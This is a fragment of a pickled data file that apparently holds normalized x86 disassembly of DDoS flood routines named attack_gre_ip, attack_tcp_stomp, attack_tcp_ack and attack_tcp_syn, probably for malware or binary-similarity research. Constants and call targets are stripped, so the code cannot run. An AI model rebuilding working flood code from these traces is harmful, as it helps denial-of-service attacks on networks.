nROR~AX,0\nMOV~[EBP+0],AX\nMOVZX~ECX,[ESP+0]\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],ECX\nCMP~EBX,ECX\nJL~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~ESI,[EDX+EAX*4]\nIMUL~EAX,,0\nADD~EAX,[ESP+0]\nLEA~ECX,[ESI+0]\nMOV~[ESP+0],ECX\nLEA~EBP,[ESI+0]\nLEA~EDI,[ESI+0]\nCMP~[EAX+0],0\nJA~FOO\nMOV~EBX,[EAX+0]\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nIMUL~ECX,[ESP+0],0\nMOV~EDX,[ESP+0]\nMOVZX~ECX,[ECX+EDX+0]\nSHR~EAX,CL\nADD~EBX,EAX\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOV~[ESI+0],EBX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nSUB~AX,0\nNOT~EAX\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~[ECX+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nJMP~FOO\nMOV~EAX,[ESI+0]\nMOV~[EDI+0],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nPUSH~EBP\nCALL~FOO\nLEA~EAX,[ESP+0]\nADD~ESP,0\nLEA~EDX,[EBP+0]\nPUSH~0\nPUSH~EAX\nPUSH~EDX\nCALL~FOO\nLEA~EAX,[ESP+0]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nPUSH~EBX\nPUSH~EBX\nPUSH~[ESP+0]\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~[ESI+0],0\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~[EDI+0],0\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~EDI\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~EAX,[ESP+0]\nMOV~[EAX+0],0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nMOV~EDX,[ESP+0]\nMOVZX~EAX,[EDX+0]\nPUSH~EAX\nPUSH~EDX\nPUSH~EDI\nCALL~FOO\nIMUL~EDX,[ESP+0],0\nMOV~ECX,[ESP+0]\nMOV~[ECX+0],AX\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nADD~ESP,0\nMOV~WORDPTR[EDX+EAX],0\nMOV~EAX,[ESI+0]\nMOV~[EDX+ECX+0],EAX\nMOV~[EDX+ECX+0],0\nADD~EDX,ECX\nPUSH~0\nPUSH~EDX\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~ESI\nPUSH~[ESP+0]\nCALL~FOO\nINC~[ESP+0]\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~EAX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p41
L1136L
tp42
a(S'attack_gre_ip'
p43
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~AL,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~[ESP+0],AL\nMOV~BL,[ESP+0]\nPUSH~0\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOVZX~EBX,BL\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~<STR>\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EBX,[EDX+EAX*4]\nMOV~BYTEPTR[EBX],0\nLEA~EDX,[EBX+0]\nMOV~CL,[ESP+0]\nLEA~ESI,[EBX+0]\nMOV~[EBX+0],CL\nLEA~EBP,[EBX+0]\nMOV~EDI,[ESP+0]\nLEA~EAX,[EDI+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~AL,[ESP+0]\nADD~ESP,0\nMOV~[EBX+0],AL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[EDX+0],0\nMOV~ECX,[ESP+0]\nMOV~[EBX+0],ECX\nMOV~ECX,[ESP+0]\nIMUL~EAX,[ESP+0],0\nMOV~EAX,[EAX+ECX+0]\nMOV~[EBX+0],0\nMOV~[EBX+0],EAX\nMOV~AL,[ESP+0]\nMOV~[ESI+0],AL\nLEA~EAX,[EDI+0]\nMOV~DL,[ESP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nMOV~[ESI+0],DL\nNOT~EAX\nROR~AX,0\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJZ~FOO\nMOV~[ESI+0],0\nMOV~[ESI+0],0\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJZ~FOO\nMOV~EAX,[EBX+0]\nJMP~FOO\nSUB~EAX,0\nNOT~EAX\nMOV~[ESI+0],EAX\nMOV~EAX,[ESP+0]\nINC~[ESP+0]\nROR~AX,0\nMOV~[EBP+0],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EBP+0],AX\nLEA~EAX,[EDI+0]\nROR~AX,0\nMOV~[EBP+0],AX\nMOVZX~ECX,[ESP+0]\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],ECX\nCMP~EBX,ECX\nJL~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~ESI,[EDX+EAX*4]\nIMUL~EAX,,0\nADD~EAX,[ESP+0]\nLEA~EDI,[ESI+0]\nLEA~EBP,[ESI+0]\nCMP~[EAX+0],0\nJA~FOO\nMOV~EBX,[EAX+0]\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nIMUL~ECX,[ESP+0],0\nMOV~EDX,[ESP+0]\nMOVZX~ECX,[ECX+EDX+0]\nSHR~EAX,CL\nADD~EBX,EAX\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOV~[ESI+0],EBX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nSUB~AX,0\nNOT~EAX\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EBP+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nJMP~FOO\nMOV~EAX,[ESI+0]\nMOV~[EDI+0],EAX\nCMP~[ESP+0],0\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~[ESI+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~[EDI+0],0\nPOP~EBX\nPOP~EAX\nPUSH~0\nPUSH~EDI\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~EAX,[ESP+0]\nADD~EAX,0\nMOV~[EBP+0],0\nPUSH~EAX\nMOVZX~EAX,[EBP+0]\nPUSH~EAX\nPUSH~EBP\nPUSH~EDI\nCALL~FOO\nIMUL~EDX,[ESP+0],0\nMOV~ECX,[ESP+0]\nMOV~[EBP+0],AX\nADD~ESP,0\nMOV~EAX,[ESI+0]\nMOV~[EDX+ECX+0],EAX\nMOV~WORDPTR[EDX+ECX],0\nMOV~[EDX+ECX+0],0\nADD~EDX,ECX\nPUSH~0\nPUSH~EDX\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~ESI\nPUSH~[ESP+0]\nCALL~FOO\nINC~[ESP+0]\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~EAX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p44
L981L
tp45
a(S'attack_tcp_stomp'
p46
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~AL,[ESP+0]\nMOV~ESI,[ESP+0]\nMOVZX~EDI,AL\nMOV~BL,[ESP+0]\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],EAX\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~EDI\nCALL~FOO\nMOVZX~EBX,BL\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nPUSH~EBX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EDI,EAX\nCMP~EAX,0\nJZ~FOO\nPUSH~ECX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nPUSH~EDI\nCALL~FOO\nIMUL~EAX,[ESP+0],0\nADD~EAX,[ESP+0]\nMOV~[ESP+0],0\nADD~ESP,0\nCMP~[EAX+0],0\nMOV~EAX,[EAX+0]\nJA~FOO\nMOV~EBX,EAX\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nIMUL~EDX,[ESP+0],0\nMOV~ESI,[ESP+0]\nMOVZX~ECX,[EDX+ESI+0]\nSHR~EAX,CL\nADD~EBX,EAX\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOV~[ESP+0],EBX\nJMP~FOO\nMOV~[ESP+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nJMP~FOO\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ESP+0],AX\nLEA~EAX,[ESP+0]\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nMOV~[ESP+0],0\nLEA~EAX,[ESP+0]\nPUSH~ESI\nPUSH~ESI\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~EAX\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~ECX,[ESP+0]\nCMP~[ESP+0],ECX\nJNZ~FOO\nCMP~EAX,0\nJBE~FOO\nMOV~ESI,[ESP+0]\nCMP~SI,[ESP+0]\nJNZ~FOO\nMOV~DL,[ESP+0]\nMOV~AL,DL\nAND~EAX,0\nCMP~AL,0\nJNZ~FOO\nMOV~EBX,[ESP+0]\nMOV~EDX,EBX\nSHL~EDX,0\nADD~EDX,[ESP+0]\nSUB~ESP,0\nMOV~[EDX],ECX\nMOV~EAX,[EBP+0]\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[EDX+0],EAX\nMOV~EAX,[EBP+0]\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[EDX+0],EAX\nMOV~AX,[EBP+0]\nMOV~[EDX+0],AX\nMOV~EAX,[ESP+0]\nMOV~[EDX+0],SI\nADD~EAX,0\nPUSH~EAX\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EBX,[EDX+EAX*4]\nMOV~BYTEPTR[EBX],0\nLEA~EBP,[EBX+0]\nMOV~CL,[ESP+0]\nMOV~[EBX+0],CL\nMOV~EAX,[ESP+0]\nADD~EAX,0\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~AL,[ESP+0]\nADD~ESP,0\nMOV~[EBX+0],AL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~EAX,<STR>\nMOV~ECX,[ESP+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESP+0]\nSHL~EAX,0\nMOV~EDX,[EAX+ECX]\nMOV~[EBX+0],EDX\nMOV~EDX,[EAX+ECX+0]\nMOV~[EBX+0],DX\nMOV~DX,[EAX+ECX+0]\nMOV~[EBP+0],DX\nMOV~EDX,[EAX+ECX+0]\nMOV~[EBP+0],EDX\nMOV~EAX,[EAX+ECX+0]\nMOV~[EBP+0],EAX\nMOV~AL,[EBP+0]\nAND~EAX,0\nOR~[EBP+0],0\nOR~EAX,0\nMOV~[EBP+0],AL\nCALL~FOO\nMOV~CL,[ESP+0]\nMOV~DL,[ESP+0]\nMOV~[EBP+0],AX\nAND~ECX,0\nMOV~AL,[EBP+0]\nSHL~ECX,0\nAND~EAX,0\nAND~EDX,0\nOR~EAX,ECX\nSHL~EDX,0\nMOV~CL,[ESP+0]\nOR~EAX,EDX\nAND~ECX,0\nMOV~DL,[ESP+0]\nAND~EAX,0\nSHL~ECX,0\nAND~EDX,0\nSHL~EDX,0\nOR~EAX,ECX\nOR~EAX,EDX\nMOV~DL,[ESP+0]\nAND~EDX,0\nMOV~CL,[ESP+0]\nADD~EDX,EDX\nAND~EAX,0\nAND~ECX,0\nOR~EAX,EDX\nOR~EAX,ECX\nMOV~[EBP+0],AL\nPUSH~ECX\nPUSH~ECX\nLEA~EAX,[EBX+0]\nPUSH~[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nAND~DL,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nSUB~EAX,EBX\nADD~ESP,0\nCMP~EAX,0\nJLE~FOO\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nINC~[ESP+0]\nMOVZX~ESI,[ESP+0]\nMOV~[ESP+0],ESI\nCMP~[ESP+0],ESI\nJL~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~EDX,[ESP]\nCMP~[ESP+0],0\nMOV~ESI,[EDX+EAX*4]\nLEA~EDI,[ESI+0]\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJZ~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~[ESP+0]\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~[ESI+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~EBX,[ESP+0]\nSHL~ECX,0\nMOV~[ESI+0],AX\nADD~EBX,ECX\nMOV~[EDI+0],0\nMOV~EAX,[EBX+0]\nLEA~EDX,[EAX+0]\nMOV~[EBX+0],EDX\nMOV~EDX,[ESP+0]\nROR~AX,0\nMOVZX~EAX,AX\nMOV~[EDI+0],EAX\nMOV~EAX,[ECX+EDX+0]\nMOV~EDX,[ESP+0]\nROR~AX,0\nMOVZX~EAX,AX\nMOV~[EDI+0],EAX\nMOV~EAX,[ESP+0]\nADD~EDX,0\nADD~EAX,0\nROR~AX,0\nMOVZX~EAX,AX\nPUSH~EDX\nPUSH~EAX\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~ECX,[ESP+0]\nIMUL~EDX,[ESP+0],0\nMOV~[EDI+0],AX\nADD~ESP,0\nMOV~AX,[EDI+0]\nMOV~[EDX+ECX+0],AX\nADD~EDX,ECX\nPUSH~0\nPUSH~EDX\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~ESI\nPUSH~[ESP+0]\nCALL~FOO\nINC~[ESP+0]\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~EAX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p47
L1454L
tp48
a(S'attack_tcp_ack'
p49
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~AL,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~[ESP+0],AL\nMOV~BL,[ESP+0]\nPUSH~0\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOVZX~EBX,BL\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nMOV~EDI,EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~<STR>\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EBX,[EDX+EAX*4]\nLEA~EAX,[EBP+0]\nROR~AX,0\nMOV~BYTEPTR[EBX],0\nMOV~[EBX+0],AX\nMOV~CL,[ESP+0]\nLEA~ESI,[EBX+0]\nMOV~[EBX+0],CL\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~AL,[ESP+0]\nADD~ESP,0\nMOV~[EBX+0],AL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[EBX+0],EDX\nIMUL~EAX,[ESP+0],0\nMOV~EAX,[EAX+ECX+0]\nMOV~[EBX+0],EAX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOVZX~EAX,AX\nMOV~[ESI+0],EAX\nMOV~AL,[ESI+0]\nAND~EAX,0\nOR~EAX,0\nMOV~[ESI+0],AL\nMOV~AL,[ESI+0]\nMOV~CL,[ESP+0]\nMOV~DL,[ESP+0]\nAND~ECX,0\nAND~EAX,0\nSHL~ECX,0\nAND~EDX,0\nSHL~EDX,0\nOR~EAX,ECX\nMOV~ECX,EDI\nOR~EAX,EDX\nAND~ECX,0\nMOV~DL,[ESP+0]\nSHL~ECX,0\nAND~EAX,0\nAND~EDX,0\nOR~EAX,ECX\nSHL~EDX,0\nMOV~CL,[ESP+0]\nOR~EAX,EDX\nMOV~DL,[ESP+0]\nAND~EDX,0\nAND~EAX,0\nADD~EDX,EDX\nAND~ECX,0\nOR~EAX,EDX\nOR~EAX,ECX\nMOV~[ESI+0],AL\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~EAX,EDI\nTEST~AL,AL\nJZ~FOO\nOR~[ESI+0],0\nLEA~EAX,[EBX+0]\nPUSH~ESI\nPUSH~ESI\nPUSH~EBP\nPUSH~EAX\nCALL~FOO\nINC~[ESP+0]\nADD~ESP,0\nMOVZX~EDX,[ESP+0]\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],EDX\nCMP~EBX,EDX\nJL~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~ECX,[ESP]\nMOV~ESI,[ECX+EAX*4]\nIMUL~EAX,,0\nADD~EAX,[ESP+0]\nLEA~EDI,[ESI+0]\nCMP~[EAX+0],0\nJA~FOO\nMOV~EBX,[EAX+0]\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nIMUL~ECX,[ESP+0],0\nMOV~EDX,[ESP+0]\nMOVZX~ECX,[ECX+EDX+0]\nSHR~EAX,CL\nADD~EBX,EAX\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOV~[ESI+0],EBX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],EAX\nCMP~[ESP+0],0\nJZ~FOO\nLEA~EAX,[ESI+0]\nPUSH~EBX\nPUSH~EBX\nPUSH~EBP\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~[ESI+0],0\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nLEA~EDX,[EBP+0]\nMOV~[ESI+0],AX\nLEA~EAX,[EBP+0]\nMOV~[EDI+0],0\nROR~AX,0\nMOVZX~EAX,AX\nPUSH~EDX\nPUSH~EAX\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~ECX,[ESP+0]\nIMUL~EDX,[ESP+0],0\nMOV~[EDI+0],AX\nADD~ESP,0\nMOV~AX,[EDI+0]\nMOV~[EDX+ECX+0],AX\nADD~EDX,ECX\nLEA~EAX,[EBP+0]\nPUSH~0\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nPUSH~ESI\nPUSH~[ESP+0]\nCALL~FOO\nINC~[ESP+0]\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~EAX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p50
L1088L
tp51
a(S'attack_tcp_syn'
p52
